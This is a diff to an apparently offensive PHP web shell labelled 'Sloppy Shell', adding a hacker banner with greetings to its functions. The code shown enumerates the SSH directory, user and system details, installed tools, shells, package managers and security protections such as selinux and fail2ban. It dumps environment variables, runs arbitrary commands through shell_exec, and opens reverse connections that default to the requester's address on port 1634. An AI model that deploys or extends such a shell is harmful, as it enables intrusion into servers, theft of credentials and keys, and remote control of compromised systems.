@@ -1,6 +1,17 @@
 <?php
 $base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
 
+function banner(){
+    
+    echo "\033[40.▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  \033[0m\n";
+    echo "\033[40▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  \033[0m\n";
+    echo "\033[40▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  \033[0m\n";
+    echo "\033[40▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌\033[0m\n";
+    echo "\033[40 ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ \033[0m\n";
+    echo "gr33tz: Notroot\n H4ppy h4ck1ng\n\n\n";
+    
+}
+
 function b64($target, $how, $data, $ext, $dir)
 {
     /*
@@ -22,6 +33,7 @@ function b64($target, $how, $data, $ext, $dir)
 
 function checkComs()
 {
+    banner();
     echo "[ !! ]Avail Commands: [ !! ]\n";
     $lincommands = array(
         "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
@@ -36,6 +48,7 @@ function checkComs()
 
 function parseProtections()
 {
+    banner();
     echo "Protections: \n";
     $protections = array(
         "selinux", "iptables", "pfctl", "firewalld", "yast", "yast2", "fail2ban", "denyhost"
@@ -47,6 +60,7 @@ function parseProtections()
 
 function checkShells()
 {
+    banner();
     $shells = array("ksh", "csh", "zsh", "bash", "sh", "tcsh");
     echo "Shells:\n";
     foreach ($shells as $shell) {
@@ -56,6 +70,7 @@ function checkShells()
 
 function checkPack()
 {
+    banner();
     $packs = array(
         "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3", "gem", "cargo", "nuget", "ant", "emerge"
     );
@@ -94,6 +109,7 @@ function cloner($repo, $os)
 
 function checkSystem()
 {
+    banner();
     $os = array();
     if (substr(php_uname(), 0, 7) == 'Windows') {
         $iam = 'echo %USERNAME%';
@@ -108,6 +124,7 @@ function checkSystem()
 
 function showEnv($os)
 {
+    banner();
     if (!empty($os)) {
         if ($os[1] == 'Linux') {
             return shell_exec('env');
@@ -122,6 +139,7 @@ function showEnv($os)
 
 function reverseConnections($methods, $host, $port, $shell)
 {
+    banner();
 //    $errorNum = error;
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
@@ -172,6 +190,7 @@ function reverseConnections($methods, $host, $port, $shell)
 
 function executeCommands($com, $run)
 {
+    banner();
     if (!empty($com) && $run === "1") {
         echo "~ Info To Remember ~ \n" . shell_exec($com);
     }else{
